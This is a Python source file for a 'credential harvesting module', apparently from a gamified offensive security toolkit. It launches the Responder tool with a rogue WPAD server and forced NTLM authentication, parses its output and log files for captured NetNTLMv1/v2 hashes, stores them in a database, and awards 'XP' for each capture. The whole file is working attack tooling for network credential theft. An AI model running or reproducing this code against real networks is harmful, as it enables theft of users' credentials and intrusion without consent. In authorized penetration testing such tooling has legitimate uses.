"""
Credential harvesting module - captures authentication attempts.
"""

import subprocess
import re
import threading
import time
from pathlib import Path
from typing import Dict, Optional


class CredentialHarvester:
    """Handles credential capture via Responder and other methods."""

    def __init__(self, database, evolution_engine, config):
        self.db = database
        self.evolution = evolution_engine
        self.config = config
        self.responder_process = None
        self.running = False
        self.monitor_thread = None

    def start_responder(self, interface: str = None) -> bool:
        """
        Start Responder for credential harvesting.

        Args:
            interface: Network interface (default: from config)

        Returns:
            True if started successfully
        """
        if not self._check_responder_installed():
            print("Responder not installed")
            return False

        if self.running:
            print("Responder already running")
            return False

        attack_config = self.config.attack_config

        if not interface:
            interface = attack_config.responder_interface

        # Build responder command
        # Basic command: responder -I <interface> -w -F
        # -w: Start WPAD rogue server
        # -F: Force NTLM/Basic auth
        cmd = ['responder', '-I', interface, '-w', '-F']

        try:
            print(f"Starting Responder on {interface}")

            # Start responder in background
            self.responder_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            self.running = True

            # Start monitoring thread to parse output
            self.monitor_thread = threading.Thread(
                target=self._monitor_responder_output,
                daemon=True
            )
            self.monitor_thread.start()

            self.db.log_activity(
                event_type='responder_started',
                target=interface,
                details=f"Responder started on {interface}"
            )

            return True

        except Exception as e:
            print(f"Error starting Responder: {e}")
            return False

    def stop_responder(self):
        """Stop Responder if running."""
        if self.responder_process:
            self.responder_process.terminate()
            self.responder_process.wait(timeout=5)
            self.running = False

            self.db.log_activity(
                event_type='responder_stopped',
                details="Responder stopped"
            )

            print("Responder stopped")

    def _monitor_responder_output(self):
        """Monitor Responder output for captured credentials."""
        if not self.responder_process:
            return

        # Responder logs credentials to files in Responder/logs/
        # We'll monitor stdout for capture events
        while self.running and self.responder_process.poll() is None:
            try:
                line = self.responder_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                # Parse for various credential captures
                # Example lines from Responder:
                # [+] [HTTP] NTLMv2 Client   : 192.168.1.100
                # [+] [HTTP] NTLMv2 Username : DOMAIN\username
                # [+] [HTTP] NTLMv2 Hash     : username::DOMAIN:...hash...

                # Detect credential capture
                if 'NTLMv2 Hash' in line or 'NTLMv1 Hash' in line:
                    self._parse_credential_capture(line)

            except Exception as e:
                print(f"Error monitoring Responder: {e}")
                time.sleep(1)

    def _parse_credential_capture(self, line: str):
        """Parse a credential capture line from Responder."""
        try:
            # Example: [+] [HTTP] NTLMv2 Hash : username::DOMAIN:challenge:response
            match = re.search(r'NTLMv\d Hash\s+:\s+(.+)', line)
            if not match:
                return

            hash_line = match.group(1).strip()

            # Parse NetNTLM hash format: username::domain:challenge:response
            parts = hash_line.split(':')
            if len(parts) >= 5:
                username = parts[0]
                domain = parts[2] if parts[2] else None

                # Determine hash type
                hash_type = 'NTLMv2' if 'NTLMv2' in line else 'NTLMv1'

                # Store in database
                cred_id = self.db.add_credential(
                    username=f"{domain}\\{username}" if domain else username,
                    hash_type=hash_type,
                    hash_value=hash_line,
                    source='Responder'
                )

                # Award XP
                xp_result = self.evolution.add_xp('credential_captured')
                self.db.log_activity(
                    event_type='credential_captured',
                    target=username,
                    details=f"Captured {hash_type} hash for {username}",
                    xp_earned=xp_result['xp_gained']
                )

                print(f"[+] Captured {hash_type} hash for {username}")

        except Exception as e:
            print(f"Error parsing credential: {e}")

    def parse_responder_logs(self, log_dir: Path = None) -> int:
        """
        Parse existing Responder log files for credentials.

        Args:
            log_dir: Path to Responder logs (default: /usr/share/responder/logs/)

        Returns:
            Number of credentials imported
        """
        if not log_dir:
            # Default Responder log locations
            possible_paths = [
                Path('/usr/share/responder/logs'),
                Path('/opt/Responder/logs'),
                Path.home() / 'Responder' / 'logs'
            ]

            for path in possible_paths:
                if path.exists():
                    log_dir = path
                    break

        if not log_dir or not log_dir.exists():
            print("Responder logs directory not found")
            return 0

        count = 0

        # Parse NTLM hash files
        for log_file in log_dir.glob('*NTLM*.txt'):
            try:
                with open(log_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue

                        # Parse hash line
                        parts = line.split(':')
                        if len(parts) >= 5:
                            username = parts[0]
                            domain = parts[2] if parts[2] else None

                            # Check if already in database (basic check)
                            existing = self.db.get_credentials()
                            if any(c['hash_value'] == line for c in existing):
                                continue

                            # Add to database
                            self.db.add_credential(
                                username=f"{domain}\\{username}" if domain else username,
                                hash_type='NTLMv2',
                                hash_value=line,
                                source=f"Responder log: {log_file.name}"
                            )

                            count += 1

            except Exception as e:
                print(f"Error parsing {log_file}: {e}")

        if count > 0:
            # Award bulk XP
            xp_result = self.evolution.add_xp('credential_captured', count=count)
            self.db.log_activity(
                event_type='credentials_imported',
                details=f"Imported {count} credentials from Responder logs",
                xp_earned=xp_result['xp_gained']
            )

        return count

    def manual_add_credential(self, username: str, password: str = None,
                             hash_value: str = None, hash_type: str = None,
                             host_ip: str = None, service: str = None) -> int:
        """
        Manually add a captured credential.

        Returns:
            credential_id
        """
        host_id = None
        if host_ip:
            host = self.db.get_host_by_ip(host_ip)
            if host:
                host_id = host['id']
            else:
                host_id = self.db.add_host(ip=host_ip)

        cred_id = self.db.add_credential(
            username=username,
            password=password,
            hash_type=hash_type,
            hash_value=hash_value,
            host_id=host_id,
            service=service,
            source='manual'
        )

        # Award XP
        xp_result = self.evolution.add_xp('credential_captured')
        self.db.log_activity(
            event_type='credential_captured',
            target=username,
            details=f"Manually added credential for {username}",
            xp_earned=xp_result['xp_gained']
        )

        return cred_id

    def get_captured_credentials(self) -> Dict:
        """Get summary of captured credentials."""
        creds = self.db.get_credentials()

        summary = {
            'total': len(creds),
            'by_type': {},
            'recent': creds[:10],  # Last 10
            'unique_users': len(set(c['username'] for c in creds if c['username']))
        }

        # Count by hash type
        for cred in creds:
            hash_type = cred.get('hash_type', 'plaintext')
            summary['by_type'][hash_type] = summary['by_type'].get(hash_type, 0) + 1

        return summary

    def _check_responder_installed(self) -> bool:
        """Check if Responder is available."""
        try:
            subprocess.run(['which', 'responder'], capture_output=True, check=True)
            return True
        except:
            return False

    def is_running(self) -> bool:
        """Check if Responder is currently running."""
        return self.running
